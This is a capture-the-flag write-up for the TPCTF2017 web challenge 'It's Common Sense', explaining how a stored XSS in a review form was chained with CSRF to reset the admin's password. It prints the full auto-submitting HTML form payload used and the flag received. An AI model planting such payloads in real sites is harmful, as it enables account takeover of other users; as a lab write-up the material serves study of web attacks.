---
layout: post
title:  "TPCTF2017 - It's Common Sense"
author: "G0d3l"
tags: tpctf2017 web xss csrf
---

>  We found this site: [Common Sense Reviews](https://commonsensereviews.tpctf.tk/)  
We think the site owners are related to Pirates. Please retrieve the admin password.  
Author: Steven Su


## Steps
- After making an account, we can access "/account" page. The page contains two forms one for submitting a review and the second for resetting the password.
- First idea was to try an XSS on the review form; and then to steal the admin cookie. This didn't work because the cookies were protected with a http only flag.
- We searched for ways to bypass the http only protection but in vain, so we concluded that it wasn't the goal of the task.
- After reading the description again, we tried a simple CSRF attack with an XSS payload to reset the admin password and the flag was sent to our email.

## XSS Payload
{% highlight html %}
<form action="/account" method="POST" name="newpwd">
	<label>Email</label><br/>
	<input required type="text" name="email" value="[REDACTED]"/>
	<input type="hidden" value="Send Request" name="formbtn" />
	<input type="submit" value="Send Request" onclick="document.getElementById('newpwd').submit();"/>
</form>
<script>document.newpwd.submit();</script>
{% endhighlight %}


After waiting a lil bit we got this email:
> Reset Your Password  
  Congratulations! Normally, you would've reset the administrators password. For the purposes of this challenge, the flag is tpctf{D1D_Y0U_N0t1c3_Common_Sense_Reviews_1s_P4R7_0F_CSRF_19210jka010920aff}
